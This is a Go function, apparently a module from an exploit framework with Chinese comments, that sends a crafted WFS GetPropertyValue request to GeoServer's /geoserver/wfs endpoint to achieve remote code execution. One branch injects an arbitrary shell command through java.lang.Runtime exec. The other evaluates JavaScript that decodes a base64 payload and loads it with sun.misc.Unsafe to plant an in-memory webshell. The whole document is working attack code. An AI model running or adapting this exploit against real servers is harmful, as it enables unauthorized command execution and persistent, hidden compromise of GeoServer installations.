	setPayloadRequestHash7869 := func(hostInfo *httpclient.FixUrl, command string, base64memshell string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		command = strings.ReplaceAll(command, "&", "&amp;")
		command = strings.ReplaceAll(command, "<", "&lt;")
		command = strings.ReplaceAll(command, ">", "&gt;")
		command = strings.ReplaceAll(command, "\"", "&quot;")
		command = strings.ReplaceAll(command, "'", "&apos;")
		vulURL = "/geoserver/wfs"
		makeRequest := httpclient.NewPostRequestConfig(vulURL)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Header.Store("Content-Type", "application/xml")
		xml_data := ""
		if base64memshell == "nomemshell" {
			xml_data = `<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
 valueReference='exec(java.lang.Runtime.getRuntime(),"` + command + `")'>
 <wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>`
		} else {
			xml_data = `<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes ='http://www.opengis.net/fes/2.0'
xmlns:wfs ='http://www.opengis.net/wfs/2.0'>
<wfs:Query typeNames='sf:archsites'/>
<wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="` + base64memshell + `";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')
</wfs:valueReference>
</wfs:GetPropertyValue>`
		}
		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		makeRequest.Data = xml_data
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			if resp.StatusCode == 400 {
				ok = true
				return ok, vulURL, nil
			}
		}
		ok = false
		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		return ok, vulURL, err
	}
